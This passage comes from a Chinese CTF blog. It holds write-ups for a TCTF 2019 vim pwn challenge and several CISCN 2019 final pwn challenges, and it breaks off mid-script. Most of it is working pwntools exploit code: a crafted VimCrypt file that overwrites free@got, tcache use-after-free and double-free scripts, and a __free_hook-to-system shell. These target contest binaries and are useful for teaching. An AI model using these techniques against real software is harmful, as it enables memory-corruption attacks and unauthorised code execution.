<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    payload = <span class="string">&#x27;VimCrypt~04!&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;cccc&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;dddd&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;eeee&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;ffff&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;gggg&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;hhhh&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>设置参数和断点：</p>
<p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/TCTF_2019_vim/1.png?raw=true"></p>
<p><code>crypt_perm_init()</code>断点：</p>
<p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/TCTF_2019_vim/2.png?raw=true"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">crypt_perm_init(</span><br><span class="line">    cryptstate_T    *state,</span><br><span class="line">    char_u	    *key,</span><br><span class="line">    char_u	    *salt UNUSED,</span><br><span class="line">    <span class="keyword">int</span>		    salt_len UNUSED,</span><br><span class="line">    char_u	    *seed UNUSED,</span><br><span class="line">    <span class="keyword">int</span>		    seed_len UNUSED)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    ps-&gt;key = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (p = key; *p != NUL; ++p)</span><br><span class="line">    &#123;</span><br><span class="line">    ps-&gt;key = <span class="number">131</span>*ps-&gt;key + *p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现RSI指向的<code>key</code>为字符串”aNUL”，因此<code>ps-&gt;key</code>的值为0x61。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">crypt_perm_decode(</span><br><span class="line">    cryptstate_T *state,</span><br><span class="line">    char_u	*from,</span><br><span class="line">    <span class="keyword">size_t</span>	len,</span><br><span class="line">    char_u	*to)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/TCTF_2019_vim/3.png?raw=true"></p>
<p>通过调试可以发现<code>from</code>（图中的<code>rsi</code>指向的数据）即为去除<code>maigc</code>的剩余部分输入内容，也就是说<code>IV</code>即输入文件除去魔术数的前四字节。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> iv;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    to[i] = from[i];</span><br><span class="line">    iv = (iv&lt;&lt;<span class="number">8</span>) + from[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了让<code>ps-&gt;step</code>为-1，<code>ps-&gt;key</code>就要为<code>-1^iv</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ps-&gt;step = ps-&gt;key ^ iv;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/TCTF_2019_vim/4.png?raw=true"></p>
<p>由上图可以知道<code>rax</code>的值为<code>0x900000</code>即<code>ps</code>变量，<code>rcx</code>的值为<code>0x900030</code>即<code>to</code>参数。它们紧挨在一起，使得<code>to</code>的向前溢出能够覆盖<code>ps</code>变量，从而达到改写<code>ps-&gt;buffer</code>的目的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The state of encryption, referenced by cryptstate_T. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">int</span> shift;</span><br><span class="line">    <span class="keyword">int</span> step;</span><br><span class="line">    <span class="keyword">int</span> orig_size;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> cur_idx;</span><br><span class="line">    char_u *buffer;</span><br><span class="line">&#125; perm_state_T;</span><br><span class="line"></span><br><span class="line">crypt_perm_decode(</span><br><span class="line">    cryptstate_T *state,</span><br><span class="line">    char_u	*from,</span><br><span class="line">    <span class="keyword">size_t</span>	len,</span><br><span class="line">    char_u	*to)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* Step 1: Inverse of Multiplication */</span></span><br><span class="line">    i = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; len) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ps-&gt;cur_idx &lt; ps-&gt;orig_size)</span><br><span class="line">        &#123;</span><br><span class="line">            to[ps-&gt;cur_idx+<span class="number">4</span>] = from[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  	<span class="comment">/* Step 2: Inverse of Addition */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ps-&gt;shift; ++i)</span><br><span class="line">        ps-&gt;buffer[i] = to[i+<span class="number">4</span>];</span><br><span class="line">		<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是代码从<code>to[i+4]</code>处开始获得数据写入<code>ps-&gt;buffer</code>，因此需要想办法向<code>to[i+4]</code>之后的地址写入数据。</p>
<p>观察到，<code>ps-&gt;cur_idx</code>是可以被覆盖最高字节的，且在计算的时候会模上<code>from</code>的长度，所以覆盖高字节后，<code>ps-&gt;cur_idx</code>是一个很大的正数，通过求模可将写入<code>to</code>的位置移动到正向方向来进行回写。</p>
<h4 id="0x02-Pwn-it"><a href="#0x02-Pwn-it" class="headerlink" title="0x02 Pwn it"></a>0x02 Pwn it</h4><p>在程序中，有一处执行shell的地方：</p>
<p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/TCTF_2019_vim/5.png?raw=true"></p>
<p>可以执行<code>rax</code>/<code>rcx</code>的所指向的命令。</p>
<p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/TCTF_2019_vim/6.png?raw=true"></p>
<p><code>crypt_perm_decode()</code>在最后执行了<code>vim_free(ps-&gt;buffer)</code>，而在<code>vim_free()</code>中，<code>call free</code>的时候，<code>rax</code>正是保存了<code>ps-&gt;buffer</code>的地址，因此在修改<code>free@got</code>的同时通过向<code>ps-&gt;buffer</code>写入<code>cat flag</code>即可获取<code>flag</code>。</p>
<p>exp生成脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./vim&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">&#x27;VimCrypt~04!&#x27;</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&gt;i&quot;</span>, <span class="number">-1</span> ^ <span class="number">0x61</span>) <span class="comment"># iv</span></span><br><span class="line">    payload += <span class="string">&#x27;aaaaa&#x27;</span></span><br><span class="line">    payload += p64(<span class="number">0x61</span>)[::<span class="number">-1</span>]</span><br><span class="line">    payload += <span class="string">&#x27;cccccccc&#x27;</span></span><br><span class="line">    payload += p64(elf.got[<span class="string">&#x27;free&#x27;</span>] - <span class="number">4</span> - <span class="number">8</span>)[::<span class="number">-1</span>]</span><br><span class="line">    payload += <span class="string">&#x27;bbbbbbbb&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;cccccc\x00\x00&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;\x00\x00\x00\x4c\x91\x63\x00\x00&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;\x00\x00galf t&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;ac&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>tctf</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>2019全国大学生信息安全竞赛(CISCN)总决赛Pwn WriteUp</title>
    <url>/2019/07/28/ciscn-2019-final/</url>
    <content><![CDATA[<p>2019国赛总决赛部分Pwn WriteUp。</p>
<a id="more"></a>

<h2 id="C05"><a href="#C05" class="headerlink" title="C05"></a>C05</h2><p>程序一开始打开了flag文件并重定向到了666，在退出函数中，又莫名其妙地可以通过<code>scanf</code>输入。将这两点联系起来就想到了将<code>stdin</code>的<code>fd</code>改为666，使得<code>scanf</code>时操作flag文件的结构体。通过gdb强行修改<code>stdout</code>结构体中的<code>_fileno</code>进行尝试，验证成功。</p>
<p>剩下的部分就是常规的<code>tcache</code>的<em>Use After Free</em>了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_int</span>(<span class="params">p, num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your inode number:&#x27;</span>, str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_short</span>(<span class="params">p, num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your inode number:&#x27;</span>, str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_int</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_short</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_int</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_short</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./inode_heap&#x27;</span>)</span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;172.16.9.21&#x27;</span>, <span class="number">9005</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    input_int(p, <span class="number">0</span>)</span><br><span class="line">    remove_int(p)</span><br><span class="line">    input_short(p, <span class="number">0</span>)</span><br><span class="line">    remove_int(p)</span><br><span class="line">    input_short(p, <span class="number">0</span>)</span><br><span class="line">    input_short(p, <span class="number">0</span>)</span><br><span class="line">    input_short(p, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    show_int(p)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;your int type inode number :&#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    heap_addr = int(recv)</span><br><span class="line">    <span class="keyword">if</span> heap_addr &lt; <span class="number">0x100000000</span>:</span><br><span class="line">        heap_addr = <span class="number">0x100000000</span> + heap_addr</span><br><span class="line">    input_int(p, heap_addr + <span class="number">0x80</span>)</span><br><span class="line">    input_int(p, <span class="number">0</span>)</span><br><span class="line">    input_int(p, <span class="number">0x91</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    input_int(p, <span class="number">0</span>)</span><br><span class="line">    input_int(p, <span class="number">0</span>)</span><br><span class="line">    input_int(p, <span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        remove_short(p)</span><br><span class="line">        input_int(p, <span class="number">0</span>)</span><br><span class="line">    remove_short(p)</span><br><span class="line">    show_short(p)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;your short type inode number :&#x27;</span>)</span><br><span class="line">    recv = int(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> recv &lt; <span class="number">0</span>:</span><br><span class="line">        recv = <span class="number">0x10000</span> + recv</span><br><span class="line"></span><br><span class="line">    input_short(p, recv - <span class="number">0x2a0</span> + <span class="number">112</span> - <span class="number">8</span>)</span><br><span class="line">    input_short(p, <span class="number">0x0</span>)</span><br><span class="line">    input_short(p, <span class="number">0x0</span>)</span><br><span class="line">    </span><br><span class="line">    input_short(p, <span class="number">0x0</span>)</span><br><span class="line">    input_short(p, <span class="number">0x0</span>)</span><br><span class="line">    remove_short(p)</span><br><span class="line">    input_int(p, <span class="number">0</span>)</span><br><span class="line">    remove_short(p)</span><br><span class="line">    input_short(p, (heap_addr &amp; <span class="number">0xffff</span>) + (<span class="number">0x2f0</span><span class="number">-0x260</span>))</span><br><span class="line">    input_short(p, <span class="number">0x0</span>)</span><br><span class="line">    input_short(p, <span class="number">0x0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your inode number:&#x27;</span>, <span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">    <span class="keyword">print</span> hex(recv)</span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="C06"><a href="#C06" class="headerlink" title="C06"></a>C06</h2><p>常规的没有输出需要通过修改<code>stdout</code>来泄漏<em>glibc</em>地址的题目，程序本身提供了<em>heap</em>地址，所以对于<code>tcache</code>的<em>Double Free</em>也好利用很多。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, idx, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input the index\n&#x27;</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input the size\n&#x27;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;now you can write something\n&#x27;</span>, content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;gift :&#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\n1. add&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> recv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input the index\n&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;172.16.9.21&#x27;</span>, <span class="number">9006</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    heap_addr = add(p, <span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    heap_addr = int(heap_addr, <span class="number">16</span>)</span><br><span class="line">    add(p, <span class="number">1</span>, <span class="number">0x78</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">2</span>, <span class="number">0x78</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    <span class="comment">#add(p, 3, 0x78, &#x27;sunichi&#x27;)</span></span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    add(p, <span class="number">4</span>, <span class="number">0x78</span>, p64(heap_addr + <span class="number">0x70</span>))</span><br><span class="line">    add(p, <span class="number">5</span>, <span class="number">0x78</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">6</span>, <span class="number">0x78</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>))</span><br><span class="line">    add(p, <span class="number">7</span>, <span class="number">0x30</span>, <span class="string">&#x27;0x30&#x27;</span>)</span><br><span class="line">    <span class="comment">#add(p, 8, 0x40, &#x27;0x40&#x27;)</span></span><br><span class="line">    <span class="comment">#add(p, 9, 0x50, &#x27;0x50&#x27;)</span></span><br><span class="line">    add(p, <span class="number">10</span>, <span class="number">0x60</span>, <span class="string">&#x27;0x60&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">11</span>, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        delete(p, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">11</span>)</span><br><span class="line">    delete(p, <span class="number">11</span>)</span><br><span class="line">    add(p, <span class="number">12</span>, <span class="number">0x20</span>, p64(heap_addr + <span class="number">0x80</span>))</span><br><span class="line">    add(p, <span class="number">13</span>, <span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">14</span>, <span class="number">0x20</span>, <span class="string">&#x27;\x60\x77&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">10</span>)</span><br><span class="line">    delete(p, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">15</span>, <span class="number">0x60</span>, p64(heap_addr + <span class="number">0x80</span>))</span><br><span class="line">    add(p, <span class="number">16</span>, <span class="number">0x60</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">17</span>, <span class="number">0x60</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input the index\n&#x27;</span>, str(<span class="number">18</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input the size\n&#x27;</span>, str(<span class="number">0x60</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;now you can write something\n&#x27;</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    recv = p.recv(<span class="number">8</span>)</span><br><span class="line">    recv = p.recv(<span class="number">8</span>)</span><br><span class="line">    libc.address = u64(recv) - (<span class="number">0x7ffff7a488b0</span> - <span class="number">0x00007ffff765b000</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line">    delete(p, <span class="number">7</span>)</span><br><span class="line">    delete(p, <span class="number">7</span>)</span><br><span class="line">    add(p, <span class="number">3</span>, <span class="number">0x30</span>, p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    add(p, <span class="number">8</span>, <span class="number">0x30</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">9</span>, <span class="number">0x30</span>, p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    delete(p, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="C10"><a href="#C10" class="headerlink" title="C10"></a>C10</h2><p>迷宫部分是Sissel大佬写的代码，走完迷宫后会提供<em>glibc</em>地址。后续就是常规的<em>off by null</em>的利用，就是程序申请的chunk较多，需要排列好被利用的chunk的顺序。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up</span>(<span class="params">location</span>):</span></span><br><span class="line">    <span class="comment">#横坐标为0，无法再向上走</span></span><br><span class="line">    <span class="keyword">if</span> location[<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        new_location = [location[<span class="number">0</span>],location[<span class="number">1</span>]<span class="number">-1</span>]</span><br><span class="line">        <span class="comment">#已经尝试过的点不会尝试第二次</span></span><br><span class="line">        <span class="keyword">if</span> new_location <span class="keyword">in</span> route_history:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment">#碰到墙不走</span></span><br><span class="line">        <span class="keyword">elif</span> source[new_location[<span class="number">0</span>]][new_location[<span class="number">1</span>]] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            route_stack.append(new_location)</span><br><span class="line">            route_history.append(new_location)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">down</span>(<span class="params">location</span>):</span></span><br><span class="line">    <span class="keyword">if</span> location[<span class="number">1</span>] == <span class="number">41</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        new_location = [location[<span class="number">0</span>],location[<span class="number">1</span>]+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> new_location <span class="keyword">in</span> route_history:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> source[new_location[<span class="number">0</span>]][new_location[<span class="number">1</span>]] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            route_stack.append(new_location)</span><br><span class="line">            route_history.append(new_location)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left</span>(<span class="params">location</span>):</span></span><br><span class="line">    <span class="keyword">if</span> location[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        new_location = [location[<span class="number">0</span>]<span class="number">-1</span>,location[<span class="number">1</span>]]</span><br><span class="line">        <span class="keyword">if</span> new_location <span class="keyword">in</span> route_history:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> source[new_location[<span class="number">0</span>]][new_location[<span class="number">1</span>]] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            route_stack.append(new_location)</span><br><span class="line">            route_history.append(new_location)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">right</span>(<span class="params">location</span>):</span></span><br><span class="line">    <span class="keyword">if</span> location[<span class="number">0</span>] == <span class="number">41</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        new_location = [location[<span class="number">0</span>]+<span class="number">1</span>,location[<span class="number">1</span>]]</span><br><span class="line">        <span class="keyword">if</span> new_location <span class="keyword">in</span> route_history:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> source[new_location[<span class="number">0</span>]][new_location[<span class="number">1</span>]] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            route_stack.append(new_location)</span><br><span class="line">            route_history.append(new_location)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">lo = [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">route_stack = [[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">ans_stack = []</span><br><span class="line">route_history = [[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">source = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">p, name, ops</span>):</span></span><br><span class="line">    